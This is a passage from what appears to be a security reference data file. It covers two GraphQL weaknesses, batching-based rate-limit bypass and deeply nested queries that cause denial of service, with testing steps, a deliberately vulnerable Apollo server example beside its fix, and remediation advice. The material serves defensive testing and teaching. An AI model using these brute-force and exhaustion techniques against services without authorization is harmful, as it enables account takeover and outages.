      "Compare the effective rate-limit behavior between single-operation requests and batched requests targeting the same sensitive operation"
    ],
    tools: ["Burp Suite (manual batch construction)", "InQL", "custom scripts for generating large aliased query documents"],
    automated_testing:
      "There is no fully generic scanner for batching-based rate-limit bypass since it " +
      "requires understanding which operations are rate-limit-sensitive; the practical " +
      "approach is to identify sensitive mutations via schema/introspection review, then " +
      "manually construct and send a batched request with many aliased instances, comparing " +
      "against the single-operation rate-limit threshold.",
    manual_testing: [
      "Identify rate-limit-sensitive GraphQL mutations (login, password reset, OTP verification, coupon redemption, account creation)",
      "Determine the current per-HTTP-request rate limit for the endpoint",
      "Construct a single GraphQL request with the sensitive mutation aliased many times, each with different guessed credentials/values",
      "Send the batched request and observe whether all aliased operations execute successfully despite exceeding the nominal per-request rate limit",
      "Test both alias-based batching (within one query document) and array-based batching (multiple query objects in one JSON body) if supported by the server"
    ],
    remediation:
      "Implement rate limiting and brute-force protection at the resolver/business-logic " +
      "level (per-account, per-operation), not solely at the HTTP-request layer, since GraphQL " +
      "batching means one HTTP request can contain arbitrarily many logical operations. " +
      "Enforce query complexity/cost analysis to reject overly large or deeply nested batched " +
      "requests outright, and consider disabling array-based batching entirely if it is not a " +
      "genuine business requirement, limiting exposure to alias-based batching only.",
    references: [
      "https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html",
      "https://portswigger.net/web-security/graphql"
    ],
    difficulty: "Medium",
    commonness: "Uncommon"
  },

  {
    id: "graphql-nested-dos",
    name: "GraphQL Nested Query Denial of Service",
    category: "Configuration",
    cwe: "CWE-400",
    owasp_category: "A04:2021 - Insecure Design",
    description:
      "GraphQL's ability to traverse related types via nested selections (a query for a " +
      "user can request their posts, each post's comments, each comment's author, that " +
      "author's other posts, and so on) creates a resource-exhaustion risk if the server " +
      "does not limit query depth or the total computed complexity/cost of a request. A " +
      "deeply nested or intentionally circular query -- especially one exploiting a " +
      "self-referential schema relationship (user -> friends -> friends -> friends...) -- can " +
      "cause the resolver chain to fan out exponentially, generating an enormous number of " +
      "database calls or in-memory objects from a single, relatively small request body.\n\n" +
      "This is functionally the GraphQL-specific analog of XML's 'billion laughs' entity " +
      "expansion attack, and is particularly dangerous because a query that is syntactically " +
      "modest in size (a few hundred bytes of nested field selections) can trigger " +
      "computational cost many orders of magnitude larger once fully resolved, making " +
      "traditional request-size-based rate limiting completely ineffective as a defense.",
    impact:
      "Denial of service via CPU, memory, or database connection exhaustion from a single " +
      "malicious request; can degrade or take down the service for all users, and depending " +
      "on database connection pool exhaustion, may cascade to affect unrelated services " +
      "sharing the same database.",
    examples: [
      {
        title: "Social graph API with no query depth or complexity limit",
        vulnerable_code:
          "const server = new ApolloServer({ typeDefs, resolvers }); // no validationRules configured\n\n" +
          "// Schema allows: type User { friends: [User!]! posts: [Post!]! }\n" +
          "// A client can nest \"friends { friends { friends { friends { ... } } } }\"\n" +
          "// arbitrarily deep, and each level triggers a new database query per resolver call",
        fixed_code:
          "const depthLimit = require('graphql-depth-limit');\n" +
          "const { createComplexityLimitRule } = require('graphql-validation-complexity');\n\n" +
          "const server = new ApolloServer({\n" +
          "  typeDefs,\n" +
          "  resolvers,\n" +
          "  validationRules: [\n" +
          "    depthLimit(6), // reject queries nested deeper than 6 levels\n" +
          "    createComplexityLimitRule(1000, {\n" +
          "      scalarCost: 1,\n" +
          "      objectCost: 2,\n" +
          "      listFactor: 10 // penalize list fields heavily, since they fan out\n" +
          "    })\n" +
          "  ]\n" +
          "});\n" +
          "// Also implement DataLoader-based batching to prevent N+1 query explosion\n" +
          "// even for queries that pass the depth/complexity checks.",
        explanation:
          "A malicious client submits a query nesting the friends field 15-20 levels deep; " +
          "since each level triggers a fresh set of resolver calls (and, without DataLoader " +
          "batching, likely a fresh database query per object at each level), the total " +
          "number of database calls grows combinatorially with depth, and a modest social " +
          "graph can produce millions of resolver invocations from one request, exhausting " +
          "CPU, memory, and database connections. The fix adds both a hard depth limit and a " +
          "computed complexity/cost limit (weighting list-returning fields more heavily, since " +
          "they are the actual source of fan-out) as GraphQL validation rules that reject " +
          "oversized queries before execution begins, combined with DataLoader-based request " +
          "batching to keep even legitimate nested queries efficient."
      }
    ],
    detection_methods: [
      "Submit deeply nested queries against any self-referential or recursively-typed relationship in the schema and monitor server response time and resource usage",
      "Submit queries requesting many list-returning fields at multiple nesting levels to test for complexity-based (not just depth-based) exhaustion",
      "Check whether the server enforces any timeout, depth limit, or complexity limit by observing behavior at increasing nesting levels"
    ],
    tools: ["InQL (query generation)", "custom Python/Node.js scripts to programmatically generate deeply nested queries", "load testing tools (k6, Locust) for confirming resource impact at scale"],
    automated_testing:
      "There is no single standard scanner for this class; the practical approach is a " +
      "small custom script that recursively builds a GraphQL query string nesting a " +
      "self-referential field to increasing depths (5, 10, 15, 20 levels) and measures " +
      "response time and, where authorized in a controlled test environment, server resource " +
      "utilization at each depth to identify the point of unacceptable degradation.",
    manual_testing: [
      "Review the schema (via introspection or documentation) for self-referential or deeply relational types",
      "Construct queries nesting these relationships to increasing depths and measure response time and any observable resource impact",
      "Test complexity independent of raw depth by requesting many list-returning fields at each level rather than a single nested object",
      "Confirm whether any depth or complexity validation rule rejects the query outright versus allowing it to execute and simply taking a long time",
      "Only conduct actual resource-exhaustion testing in a controlled, authorized environment given the inherent risk of degrading production availability"
    ],
    remediation:
      "Enforce both a maximum query depth limit and a computed query complexity/cost limit " +
      "as GraphQL validation rules, rejecting requests that exceed either threshold before " +
      "resolver execution begins. Weight list-returning and relationally-fanning fields more " +
      "heavily in the complexity calculation than scalar fields. Use DataLoader-style request " +
      "batching and caching to prevent N+1 query explosion for legitimate nested queries that " +
      "do pass the complexity check. Set reasonable global request timeouts as a final " +
      "backstop.",
    references: [
      "https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html",
      "https://www.npmjs.com/package/graphql-depth-limit"
    ],
    difficulty: "Medium",
    commonness: "Uncommon"
  },

